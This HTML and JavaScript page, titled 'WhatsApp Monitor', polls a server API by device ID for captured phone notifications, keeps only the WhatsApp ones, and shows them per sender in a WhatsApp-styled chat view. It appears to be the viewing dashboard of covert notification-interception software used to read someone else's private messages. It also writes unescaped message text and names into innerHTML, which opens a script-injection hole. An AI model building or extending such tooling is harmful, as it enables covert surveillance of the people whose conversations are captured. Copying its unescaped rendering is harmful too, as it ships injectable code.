<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Monitor</title>
    <style>
        /* WhatsApp Theme Styles */
        body { margin: 0; font-family: sans-serif; background-color: #111b21; color: #e9edef; display: flex; height: 100vh; overflow: hidden; }
        
        /* Left Sidebar (Contact List) */
        .sidebar { width: 30%; background-color: #202c33; border-right: 1px solid #374045; display: flex; flex-direction: column; }
        .header { background-color: #202c33; padding: 15px; border-bottom: 1px solid #374045; font-weight: bold; color: #aebac1; }
        .contact-list { flex: 1; overflow-y: auto; }
        .contact { display: flex; align-items: center; padding: 12px; cursor: pointer; border-bottom: 1px solid #2a3942; transition: 0.2s; }
        .contact:hover { background-color: #2a3942; }
        .avatar { width: 45px; height: 45px; background-color: #00a884; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px; color: white; margin-right: 15px; }
        .info { flex: 1; }
        .name { font-size: 16px; color: #e9edef; font-weight: 500; }
        .last-msg { font-size: 13px; color: #8696a0; margin-top: 3px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 200px; }

        /* Right Side (Chat Window) */
        .chat-area { flex: 1; display: flex; flex-direction: column; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-color: #0b141a; }
        .chat-header { background-color: #202c33; padding: 10px 20px; display: flex; align-items: center; border-bottom: 1px solid #374045; }
        .chat-title { font-size: 18px; margin-left: 15px; }
        
        .messages { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
        
        /* Message Bubbles */
        .msg { max-width: 60%; padding: 8px 12px; border-radius: 8px; font-size: 14.5px; line-height: 1.4; position: relative; word-wrap: break-word; }
        .incoming { align-self: flex-start; background-color: #202c33; color: #e9edef; border-top-left-radius: 0; }
        .outgoing { align-self: flex-end; background-color: #005c4b; color: #e9edef; border-top-right-radius: 0; } /* Future use */
        
        .time { font-size: 11px; color: #8696a0; text-align: right; margin-top: 4px; display: block; }

        /* Scrollbar */
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-thumb { background: #374045; }
    </style>
</head>
<body>

    <div class="sidebar">
        <div class="header">Chats</div>
        <div class="contact-list" id="contactList">
            <div style="padding:20px; text-align:center; color:#8696a0;">Loading...</div>
        </div>
    </div>

    <div class="chat-area">
        <div class="chat-header" id="chatHeader" style="display:none;">
            <div class="avatar" id="headerAvatar">?</div>
            <div class="chat-title" id="headerName">Select a Contact</div>
        </div>
        <div class="messages" id="messageBox">
            <div style="margin:auto; color:#8696a0;">Select a contact to view history</div>
        </div>
    </div>

    <script>
        // URL se Device ID nikalo (?deviceId=xxxx)
        const urlParams = new URLSearchParams(window.location.search);
        const deviceId = urlParams.get('deviceId');

        let allData = [];

        if (!deviceId) {
            alert("Device ID missing in URL!");
        } else {
            fetchMessages();
            // Har 10 second me refresh karo
            setInterval(fetchMessages, 10000);
        }

        async function fetchMessages() {
            try {
                const response = await fetch(`/api/get-notifications?deviceId=${deviceId}`);
                const rawData = await response.json();

                // Sirf WhatsApp ka data filter karo
                allData = rawData.filter(item => 
                    item.packageName && item.packageName.includes("whatsapp")
                );
                
                renderContacts();
            } catch (error) {
                console.error("Error fetching data:", error);
            }
        }

        function renderContacts() {
            const list = document.getElementById('contactList');
            const contacts = {};

            // Data ko Sender (Title) ke hisab se group karo
            allData.forEach(msg => {
                const name = msg.title || "Unknown";
                if (!contacts[name]) contacts[name] = [];
                contacts[name].push(msg);
            });

            list.innerHTML = "";
            
            Object.keys(contacts).forEach(name => {
                const msgs = contacts[name];
                const lastMsg = msgs[msgs.length - 1]; // Sabse naya message

                const div = document.createElement('div');
                div.className = 'contact';
                div.innerHTML = `
                    <div class="avatar">${name.charAt(0).toUpperCase()}</div>
                    <div class="info">
                        <div class="name">${name}</div>
                        <div class="last-msg">${lastMsg.text}</div>
                    </div>
                `;
                div.onclick = () => openChat(name, msgs);
                list.appendChild(div);
            });
        }

        function openChat(name, messages) {
            document.getElementById('chatHeader').style.display = 'flex';
            document.getElementById('headerName').innerText = name;
            document.getElementById('headerAvatar').innerText = name.charAt(0).toUpperCase();

            const box = document.getElementById('messageBox');
            box.innerHTML = "";

            // Messages ko time ke hisab se sort karo
            messages.sort((a, b) => a.postTime - b.postTime);

            messages.forEach(msg => {
                const date = new Date(parseInt(msg.postTime));
                const timeStr = date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });

                const div = document.createElement('div');
                div.className = 'msg incoming';
                div.innerHTML = `
                    ${msg.text.replace(/\n/g, '<br>')}
                    <span class="time">${timeStr}</span>
                `;
                box.appendChild(div);
            });

            // Scroll to bottom
            box.scrollTop = box.scrollHeight;
        }
    </script>
</body>
</html>
